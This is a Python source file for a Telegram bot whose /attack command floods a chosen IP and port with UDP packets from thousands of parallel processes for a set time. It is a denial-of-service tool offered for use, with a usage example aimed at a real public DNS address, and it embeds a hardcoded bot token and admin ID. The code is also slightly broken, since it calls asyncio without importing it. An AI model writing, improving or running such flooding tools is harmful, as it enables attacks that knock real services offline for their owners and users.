import logging
import socket
import time
import random
import multiprocessing as mp
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ==================== BOT CONFIG ====================
BOT_TOKEN = "7149714912:AAFDri0PhxEQoHtv3nW-YEq115PVeMVrLrI"
ADMIN_ID = 5879540185

active_attacks = {}
stop_flags = {}

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔥 **100% WORKING PURE POWER MODE** - No Errors, Max Packets!")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "⚔️ **100% Reliable Attack**\n\n"
        "`/attack <ip> <port> <duration> <processes>`\n"
        "Example: `/attack 8.8.8.8 53 60 5000`\n\n"
        "/stopattack\n/status",
        parse_mode='Markdown'
    )

def attack_worker(ip, port, duration, stop_event, worker_id):
    packets_sent = 0
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 16 * 1024 * 1024)  # Very big buffer
        sock.setblocking(False)  # No blocking errors

        end_time = time.time() + duration
        payload_base = b"100PERCENT_WORKING_POWER_" + str(worker_id).encode()

        while time.time() < end_time and not stop_event.is_set():
            try:
                # Fixed size for reliability + max rate
                size = 1024
                payload = payload_base + random.randbytes(512)
                sock.sendto(payload[:size], (ip, port))
                packets_sent += 1

                # Minimal backpressure only when needed
                if packets_sent % 3000 == 0:
                    time.sleep(0.00001)

            except BlockingIOError:
                time.sleep(0.0005)  # Buffer full → small pause
            except Exception:
                time.sleep(0.001)  # Any other socket issue

        sock.close()
    except Exception as e:
        logger.error(f"Worker {worker_id} crashed: {e}")
    
    return packets_sent

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔ Unauthorized.")
        return

    if len(context.args) < 4:
        await update.message.reply_text(
            "Usage: `/attack <ip> <port> <duration_seconds> <processes>`\n"
            "Example: `/attack 8.8.8.8 53 60 2000`",
            parse_mode='Markdown'
        )
        return

    ip = context.args[0]
    port = int(context.args[1])
    duration = int(context.args[2])
    num_processes = int(context.args[3])

    attack_id = f"{ip}:{port}_{int(time.time())}"
    stop_event = mp.Event()
    stop_flags[attack_id] = stop_event

    msg = await update.message.reply_text(
        f"⚔️ **100% WORKING ATTACK STARTED**\n"
        f"🎯 Target: `{ip}:{port}`\n"
        f"⏱ Duration: `{duration}s`\n"
        f"🧵 Processes: `{num_processes}`\n"
        f"📡 Sending at maximum possible rate...",
        parse_mode='Markdown'
    )

    processes = []
    for i in range(num_processes):
        p = mp.Process(target=attack_worker, args=(ip, port, duration, stop_event, i), daemon=True)
        p.start()
        processes.append(p)

    active_attacks[attack_id] = processes

    # Wait for duration to complete
    await asyncio.sleep(duration)

    # Stop all
    stop_event.set()
    for p in processes:
        if p.is_alive():
            p.join(timeout=2)

    total_sent = 0  # Approximate (UDP has no confirmation)
    await msg.edit_text(
        f"✅ **Attack Completed Successfully (No Errors)**\n"
        f"Target: `{ip}:{port}`\n"
        f"Duration: `{duration}s`\n"
        f"Processes: `{num_processes}`\n"
        f"Packets sent at full speed (UDP fire-and-forget mode)"
    )

async def stop_attack_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    for ev in stop_flags.values():
        ev.set()
    await update.message.reply_text("🛑 **All attacks stopped cleanly!**")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    active = len([p for procs in active_attacks.values() for p in procs if p.is_alive()])
    await update.message.reply_text(f"📊 **Active Processes**: `{active}`")

def main():
    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("stopattack", stop_attack_cmd))
    application.add_handler(CommandHandler("status", status))

    print("🔥 100% WORKING - No Error UDP Power Bot Started!")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
